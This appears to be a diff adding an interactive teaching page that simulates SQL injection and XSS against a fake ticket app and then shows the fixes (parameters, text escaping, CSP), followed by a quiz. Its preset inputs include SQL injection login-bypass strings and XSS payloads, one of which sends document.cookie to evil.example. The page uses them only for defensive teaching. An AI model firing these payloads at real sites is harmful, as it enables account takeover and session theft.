@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="description" content="Attack a sandboxed fake ticket app with SQL injection and XSS, then apply the fix and try again.">
+<title>SQL Injection and XSS · System Design Lab</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@500;600&family=IBM+Plex+Sans:wght@400;500;600&family=Silkscreen:wght@400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/explainer.css">
+</head>
+<body>
+<header class="topbar"><div class="topbar-inner">
+  <a class="brand" href="../">system<b>.design.lab</b></a>
+  <nav class="acts" aria-label="Sections"><a href="#sqli">SQL injection</a><a href="#xss">XSS</a><a href="#real">The code</a><a href="#recap">Recap</a></nav>
+</div></header>
+
+<main id="top">
+<section class="panel hero">
+  <div class="panel-label"><span>page 4 · stage 1 · one server</span><span class="hot">78 · 79</span></div>
+  <div class="eyebrow">SQL injection, cross-site scripting (XSS)</div>
+  <h1>The attack is just text. <em>The bug is treating it as code.</em></h1>
+  <div class="scenario"><b>Encore</b>Encore has a login form and a review box under every concert. Both take whatever a user types and put it somewhere: into a database query, and into a web page. Below is a sandboxed copy of each. Nothing here touches a real database or runs real scripts.</div>
+  <div class="row"><a class="btn primary" href="#sqli" style="text-decoration:none">Start attacking ↓</a></div>
+</section>
+
+<section class="panel" id="sqli">
+  <div class="panel-label"><span>sandbox 1 · sql injection</span><span class="hot" id="sqlTag">string building</span></div>
+  <h2>Log in as the admin without knowing the password</h2>
+  <div class="lab">
+    <div class="controls">
+      <div class="ctl"><label for="em">Email</label><input class="input" id="em" value="ana@encore.example" autocomplete="off" spellcheck="false"></div>
+      <div class="ctl"><label for="pw">Password</label><input class="input" id="pw" value="tickets123" autocomplete="off" spellcheck="false"></div>
+    </div>
+    <div class="row" style="margin:0">
+      <div class="presets" id="sqlPresets"></div>
+    </div>
+    <div class="controls">
+      <div class="ctl"><span class="lab-k">How the server builds the query</span><div id="sqlSeg"></div></div>
+      <div class="ctl"><span class="lab-k">&nbsp;</span><div><button class="btn primary" id="loginBtn" type="button">Log in</button></div></div>
+    </div>
+    <div>
+      <div class="lab-k" style="font-size:14px;font-weight:500;margin-bottom:6px">What the database receives</div>
+      <pre class="sqlbox" id="sqlOut" aria-live="polite"></pre>
+      <p class="muted" style="font-size:13px;margin:6px 0 0"><span class="sqlbox" style="display:inline;padding:0 4px"><span class="u">orange</span></span> = what you typed, read as SQL. <span class="sqlbox" style="display:inline;padding:0 4px"><span class="u data">green</span></span> = what you typed, kept as data. Struck through = ignored by the database.</p>
+    </div>
+    <div class="status" id="sqlRes" role="status">Pick an attack above, or type your own, then press Log in.</div>
+  </div>
+</section>
+
+<section class="panel" id="xss">
+  <div class="panel-label"><span>sandbox 2 · cross-site scripting</span><span class="hot" id="xssTag">innerHTML</span></div>
+  <h2>Post a review that attacks every fan who reads it</h2>
+  <div class="lab">
+    <div class="ctl"><label for="rv">Your review of “Reunion Tour · Night 1”</label><input class="input" id="rv" value="Best night of my life!!" autocomplete="off" spellcheck="false"></div>
+    <div class="presets" id="xssPresets"></div>
+    <div class="controls">
+      <div class="ctl"><span class="lab-k">How the page shows reviews</span><div id="xssSeg"></div></div>
+      <div class="ctl"><span class="lab-k">&nbsp;</span><div><button class="btn primary" id="postBtn" type="button">Post review</button></div></div>
+    </div>
+    <div class="browser" aria-label="Simulated browser showing the concert page">
+      <div class="bar2">encore.example/concerts/reunion-night-1 · as another fan sees it (simulated)</div>
+      <div class="body2" id="reviews"></div>
+    </div>
+    <div class="status" id="xssRes" role="status">Reviews render in a simulated browser. Real HTML from the box is never inserted into this page.</div>
+  </div>
+
+  <h3>Try this</h3>
+  <ol class="missions" id="missions"></ol>
+
+  <div class="takeaway"><div class="t">The one difference</div><p>Both attacks work the same way: <b>user text gets mixed into code</b> (SQL or HTML) and the computer can't tell where your text ends and the code starts. The fix also works the same way: keep the data separate from the code. Use <b>parameters</b> for SQL, and <b>escape output</b> for HTML.</p></div>
+</section>
+
+<section class="panel" id="real">
+  <div class="panel-label"><span>act 3 · the real thing</span><span class="hot">code</span></div>
+  <h2>The bug and the fix, side by side</h2>
+  <p>Each fix is a one-line change. <b>Hover or tap a line.</b></p>
+  <div class="yaml-wrap">
+    <pre class="yaml" id="code" aria-label="Vulnerable and fixed code"></pre>
+    <div class="explain" aria-live="polite"><div class="t" id="exT">👆 pick a line</div><p id="exP">Each highlighted line maps to a sandbox mode.</p></div>
+  </div>
+</section>
+
+<section class="panel" id="recap">
+  <div class="panel-label"><span>recap · keep this</span><span class="hot">♥</span></div>
+  <h2>The whole page on one screen</h2>
+  <div class="cards">
+    <div class="card"><div class="sub">Attacks the database</div><div class="t">SQL injection</div><p>Input glued into a query string changes the query itself: skip the password check, read other users' data, delete tables. Fix: parameterized queries.</p></div>
+    <div class="card"><div class="sub">Attacks your users</div><div class="t">XSS</div><p>Input inserted into a page as HTML becomes a script that runs in every visitor's browser, as them. Fix: insert text, not HTML (escape output), plus a CSP.</p></div>
+    <div class="card"><div class="sub">The rule</div><div class="t">Data ≠ code</div><p>Never build code by gluing user text into it. Let the database driver or the browser keep the two apart.</p></div>
+  </div>
+  <div class="takeaway"><div class="t">The tradeoff</div><p>The fixes cost almost nothing, and modern frameworks do them by default. The risk lives in the escape hatches: raw SQL helpers, <code>innerHTML</code>, <code>dangerouslySetInnerHTML</code>, <code>|safe</code>. Review every one.</p></div>
+
+  <h3 style="margin-top:26px">Check it <span class="score" id="score"></span></h3>
+  <ol class="mcq" id="quiz"></ol>
+</section>
+
+<nav class="pager" id="pager" aria-label="Pages"></nav>
+</main>
+
+<script src="../assets/explainer.js"></script>
+<script>
+(() => {
+const { $, el, esc } = X;
+const USERS = [
+  { email: 'admin@encore.example', pw: 'Xk9#long-secret', name: 'Admin', role: 'admin: can see every order and refund any ticket' },
+  { email: 'ana@encore.example', pw: 'tickets123', name: 'Ana', role: 'fan' },
+  { email: 'ben@encore.example', pw: 'hunter2', name: 'Ben', role: 'fan' },
+];
+const state = { sqlSafe: false, htmlSafe: false, adminBreach: false, blockedAfterFix: false, xssRan: false, xssBlocked: false, normalLogin: false };
+
+/* ---------- SQL sandbox (pure evaluation) ---------- */
+function evaluateLogin(email, pw, safe) {
+  const exact = () => {
+    const u = USERS.find(x => x.email === email && x.pw === pw);
+    return u ? { kind: 'ok', user: u, rows: 1 } : { kind: 'none', rows: 0 };
+  };
+  if (safe || (!email.includes("'") && !pw.includes("'"))) return exact();
+  const all = email + ' ' + pw;
+  if (/;\s*drop\s+table/i.test(all)) return { kind: 'drop' };
+  if (/'\s*or\s*'?1'?\s*=\s*'?1/i.test(all)) return { kind: 'ok', user: USERS[0], rows: USERS.length, injected: true };
+  const m = email.match(/^([^']*)'\s*--/);
+  if (m) {
+    const u = USERS.find(x => x.email === m[1]);
+    return u ? { kind: 'ok', user: u, rows: 1, injected: true } : { kind: 'none', rows: 0, injected: true };
+  }
+  return { kind: 'syntax', near: email.includes("'") ? email.slice(email.indexOf("'") + 1, email.indexOf("'") + 12) : pw.slice(pw.indexOf("'") + 1, pw.indexOf("'") + 12) };
+}
+function renderQuery(email, pw, safe) {
+  if (safe) {
+    return `<span class="k">SELECT</span> * <span class="k">FROM</span> users <span class="k">WHERE</span> email = $1 <span class="k">AND</span> password = $2\n\nparams: [ "<span class="u data">${esc(email)}</span>", "<span class="u data">${esc(pw)}</span>" ]`;
+  }
+  const parts = [["SELECT * FROM users WHERE email = '", 0], [email, 1], ["' AND password = '", 0], [pw, 1], ["'", 0]];
+  const chars = parts.flatMap(([t, u]) => [...t].map(ch => ({ ch, u })));
+  const str = chars.map(c => c.ch).join('');
+  let dead = -1;
+  for (let i = str.indexOf('--'); i !== -1; i = str.indexOf('--', i + 1)) if (chars[i].u) { dead = i; break; }
+  let html = '', cur = null;
+  const flush = (cls, buf) => { if (buf) html += cls ? `<span class="${cls}">${esc(buf)}</span>` : esc(buf); };
+  let buf = '';
+  chars.forEach((c, i) => {
+    const cls = [c.u ? 'u' : '', dead >= 0 && i >= dead ? 'dead' : ''].filter(Boolean).join(' ');
+    if (cls !== cur) { flush(cur, buf); buf = ''; cur = cls; }
+    buf += c.ch;
+  });
+  flush(cur, buf);
+  return html;
+}
+let sqlSafe = false;
+const sqlPresetList = [
+  ['Normal login', 'ana@encore.example', 'tickets123'],
+  ['Skip the password', "admin@encore.example' --", 'anything'],
+  ['Always true', "' OR '1'='1' --", 'x'],
+  ['A real name with a quote', "o'brien@encore.example", 'pass'],
+];
+sqlPresetList.forEach(([label, e, p]) => {
+  const b = el('button', 'btn sm', label); b.type = 'button';
+  b.onclick = () => { $('#em').value = e; $('#pw').value = p; showQuery(); };
+  $('#sqlPresets').append(b);
+});
+const showQuery = () => { $('#sqlOut').innerHTML = renderQuery($('#em').value, $('#pw').value, sqlSafe); };
+['em', 'pw'].forEach(id => $('#' + id).addEventListener('input', showQuery));
+X.seg($('#sqlSeg'), ['Glue strings together', 'Parameters ($1, $2)'], i => { sqlSafe = i === 1; $('#sqlTag').textContent = sqlSafe ? 'parameterized' : 'string building'; showQuery(); }, 0);
+$('#loginBtn').addEventListener('click', () => {
+  const email = $('#em').value, pw = $('#pw').value;
+  const r = evaluateLogin(email, pw, sqlSafe);
+  const st = $('#sqlRes');
+  const attacky = /'/.test(email + pw);
+  if (r.kind === 'ok' && r.injected) {
+    st.className = 'status bad';
+    st.innerHTML = `✕ <b>Logged in as ${r.user.name}</b> (${r.user.role}) without the password. Your text closed the quote early${/--/.test(email) ? ', and <code>--</code> turned the password check into a comment' : ''}${r.rows > 1 ? `. The query matched all ${r.rows} users and the app picked the first one` : ''}.`;
+    if (r.user.name === 'Admin') state.adminBreach = true;
+  } else if (r.kind === 'ok') {
+    st.className = 'status ok'; st.innerHTML = `✓ Logged in as ${r.user.name}. Normal login, nothing unusual.`; state.normalLogin = true;
+  } else if (r.kind === 'drop') {
+    st.className = 'status bad'; st.innerHTML = '✕ The database ran a second command and <b>deleted the users table</b> (simulated). Everyone is locked out.';
+  } else if (r.kind === 'syntax') {
+    st.className = 'status bad'; st.innerHTML = `✕ <code>ERROR: syntax error at or near "${esc(r.near)}"</code>. The quote in the input broke the query. This error message also tells an attacker the input reaches SQL unprotected.`;
+  } else {
+    st.className = 'status ok';
+    st.innerHTML = sqlSafe && attacky
+      ? '✓ <b>Login failed.</b> The database looked for a user whose email is literally <code>' + esc(email) + '</code>. There isn\'t one. Your quotes and dashes stayed data.'
+      : '✓ Wrong email or password.';
+    if (sqlSafe && attacky && state.adminBreach) state.blockedAfterFix = true;
+  }
+  showQuery(); mis.update(state);
+});
+showQuery();
+
+/* ---------- XSS sandbox ---------- */
+let htmlSafe = false;
+const reviews = [{ by: 'Cai', text: 'Sound was incredible from the balcony.' }, { by: 'Dee', text: 'Merch line was long, but worth it.' }];
+const xssPresetList = [
+  ['Normal review', 'Best night of my life!!'],
+  ['Bold text', 'This was <b>amazing</b>'],
+  ['Steal cookies', `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">`],
+  ['Script tag', '<script>location="https://evil.example/fake-login"<\/script>'],
+];
+xssPresetList.forEach(([label, t]) => {
+  const b = el('button', 'btn sm', label); b.type = 'button';
+  b.onclick = () => { $('#rv').value = t; };
+  $('#xssPresets').append(b);
+});
+const isEvil = t => /<script|on\w+\s*=|javascript:/i.test(t);
+const stripTags = t => t.replace(/<[^>]*>/g, '');
+let victims = 0, vTimer = null;
+function drawReviews() {
+  const box = $('#reviews'); box.innerHTML = '';
+  let evilShown = false;
+  reviews.forEach(r => {
+    const d = el('div', 'review');
+    d.append(el('div', 'by', esc(r.by)));
+    const body = el('div');
+    if (htmlSafe) {
+      body.textContent = r.text; // always text: this is the fix
+      if (/[<>]/.test(r.text)) d.append(body, el('div', 'muted', `<small>HTML sent to the browser: <code>${esc(esc(r.text))}</code></small>`));
+      else d.append(body);
+    } else {
+      // Simulation of innerHTML: we never insert the HTML for real.
+      const shown = stripTags(r.text);
+      if (/<b>/i.test(r.text)) { const b = el('b'); b.textContent = shown; body.append(b); } else body.textContent = shown || ' ';
+      d.append(body);
+      if (isEvil(r.text)) {
+        evilShown = true;
+        d.append(el('div', 'status bad', `⚠ <b>Script ran in this visitor's browser</b>: ${/fake-login/.test(r.text) ? 'redirected them to a fake login page' : 'sent their session cookie to evil.example'}. (Simulated.) It runs again for every fan who opens the page.`));
+      }
+    }
+    box.append(d);
+  });
+  clearInterval(vTimer);
+  if (evilShown) { vTimer = setInterval(() => { victims += 2; $('#xssRes').innerHTML = `✕ Fans who have opened this page since the attack: <b>${victims}</b>. Every one of them ran the attacker's code.`; }, 800); }
+  return evilShown;
+}
+X.seg($('#xssSeg'), ['Insert as HTML (innerHTML)', 'Insert as text (escaped)'], i => {
+  htmlSafe = i === 1; $('#xssTag').textContent = htmlSafe ? 'textContent' : 'innerHTML';
+  const evil = drawReviews();
+  if (htmlSafe) {
+    $('#xssRes').className = 'status ok';
+    $('#xssRes').textContent = reviews.some(r => isEvil(r.text)) ? '✓ Same reviews, now inserted as text. The attack shows up as harmless characters and nothing runs.' : '✓ Reviews are inserted as text.';
+    if (reviews.some(r => isEvil(r.text)) && state.xssRan) { state.xssBlocked = true; mis.update(state); }
+  } else if (!evil) { $('#xssRes').className = 'status'; $('#xssRes').textContent = 'Reviews are inserted as HTML.'; }
+}, 0);
+$('#postBtn').addEventListener('click', () => {
+  const t = $('#rv').value.trim(); if (!t) return;
+  reviews.push({ by: 'You', text: t });
+  const evil = drawReviews();
+  const st = $('#xssRes');
+  if (evil && !htmlSafe) { st.className = 'status bad'; state.xssRan = true; victims = 0; }
+  else if (htmlSafe && isEvil(t)) { st.className = 'status ok'; st.textContent = '✓ Posted. The browser shows the characters < and > instead of creating an element, so nothing runs.'; if (state.xssRan) state.xssBlocked = true; }
+  else { st.className = 'status ok'; st.textContent = /<b>/i.test(t) && !htmlSafe ? '✓ Posted. Bold works, because the browser is reading your text as HTML. Hmm…' : '✓ Posted.'; }
+  mis.update(state);
+});
+drawReviews();
+
+const mis = X.missions($('#missions'), [
+  { text: 'In sandbox 1, log in normally as Ana.', hint: 'Use “Normal login”. Notice where your text lands in the query.', check: s => s.normalLogin },
+  { text: 'Log in as <b>Admin</b> without the password.', hint: 'Try “Skip the password”. Watch what <code>--</code> does to the rest of the query.', check: s => s.adminBreach },
+  { text: 'Switch to <b>Parameters</b> and try the same attack.', hint: 'The query and your text now travel separately.', check: s => s.blockedAfterFix },
+  { text: 'In sandbox 2, post the <b>Steal cookies</b> review.', hint: 'Watch what other fans would experience.', check: s => s.xssRan },
+  { text: 'Switch to <b>Insert as text</b>.', hint: 'Same review, same page. It just stops being code.', check: s => s.xssBlocked },
+]);
+
+/* ---------- code map ---------- */
+X.codeMap($('#code'), [
+  ['<span class="c">// ✕ SQL built by gluing strings</span>', null],
+  ['db.query(<span class="s">"SELECT * FROM users WHERE email = \'"</span> + email +', 'concat'],
+  ['         <span class="s">"\' AND password = \'"</span> + pw + <span class="s">"\'"</span>);', 'concat'],
+  ['', null],
+  ['<span class="c">// ✓ Parameterized: query and data travel separately</span>', null],
+  ['db.query(<span class="s">"SELECT * FROM users WHERE email = $1"</span>, [email]);', 'param'],
+  ['<span class="c">//   …then compare a password hash, never the plain text</span>', 'hash'],
+  ['', null],
+  ['<span class="c">// ✕ Puts the review into the page as HTML</span>', null],
+  ['reviewEl.<span class="key">innerHTML</span> = review.text;', 'inner'],
+  ['', null],
+  ['<span class="c">// ✓ Puts it in as text</span>', null],
+  ['reviewEl.<span class="key">textContent</span> = review.text;', 'text'],
+  ['', null],
+  ['<span class="c"># ✓ Safety net: an HTTP response header</span>', null],
+  ['<span class="key">Content-Security-Policy</span>: script-src <span class="s">\'self\'</span>', 'csp'],
+], {
+  concat: ['String building', 'The database gets one long string and has no way to know which part came from the user. A quote in the input ends the string early, and whatever follows is read as SQL.'],
+  param: ['Parameters', 'The query is sent with placeholders. The values are sent separately and are <b>always</b> treated as data, so quotes and dashes in them can\'t change the query. Every database driver and ORM supports this.'],
+  hash: ['Passwords', 'The sandbox compares plain passwords to keep things simple. Real apps store a slow hash (bcrypt, argon2) and compare hashes, so a leaked table doesn\'t leak passwords.'],
+  inner: ['innerHTML', 'Tells the browser “parse this as HTML”. Tags become elements, and event handlers like <code>onerror</code> become running code. React\'s <code>dangerouslySetInnerHTML</code> does the same.'],
+  text: ['textContent', 'Tells the browser “this is text”. <code>&lt;</code> shows up as a character. Frameworks like React, Vue and Svelte do this by default when you write <code>{review.text}</code>.'],
+  csp: ['Content Security Policy', 'A second layer of defense: the browser refuses to run inline scripts and scripts from other sites. It catches the bugs you miss. It doesn\'t replace escaping.'],
+}, $('#exT'), $('#exP'));
+
+/* ---------- quiz + pager ---------- */
+X.quiz($('#quiz'), [
+  { q: 'Ben suggests blocking SQL injection by deleting quote characters from every input. What\'s the problem?', opts: [
+    ['Nothing. Without quotes, injection is impossible', false, 'Attackers have many tricks that don\'t need a quote (numeric fields, encodings, other syntax). And O\'Brien can no longer sign up.'],
+    ['It breaks real input and can be bypassed. Parameterized queries fix the cause.', true, 'Filtering input guesses which characters are dangerous. Parameters remove the possibility of input becoming SQL at all.'],
+    ['It works, but it slows the database down', false, 'Speed isn\'t the issue. It\'s an incomplete defense that also rejects valid data.'],
+  ] },
+  { q: 'An attacker posts a review that runs a script. Whose data is at risk?', opts: [
+    ['Only the attacker\'s, since it\'s their review', false, 'The script runs in the browser of whoever views the page, not the person who wrote it.'],
+    ['Every fan who opens the page: the script can act as them and read what they see', true, 'That\'s what makes stored XSS serious. One post, many victims.'],
+    ['Only the database\'s', false, 'XSS runs in browsers, not on the server. It targets your users.'],
+  ] },
+  { q: 'Cai wants reviews to support bold and links, so they plan to switch to <code>dangerouslySetInnerHTML</code>. What\'s the safe way to do it?', opts: [
+    ['Just do it. React will escape it anyway.', false, 'The name is a warning: React skips escaping for exactly this prop.'],
+    ['Use a limited format (like Markdown) or an HTML sanitizer with a strict allowlist, plus a CSP', true, 'Allow only the few tags you need, strip everything else (scripts, event handlers), and keep CSP as a backup.'],
+    ['Check whether the text contains “&lt;script&gt;” and reject it', false, 'Scripts can run without a script tag (like the <code>onerror</code> example). Blocklists always miss something.'],
+  ] },
+], $('#score'));
+X.pager($('#pager'), 'sql-injection-xss');
+})();
+</script>
+</body>
+</html>
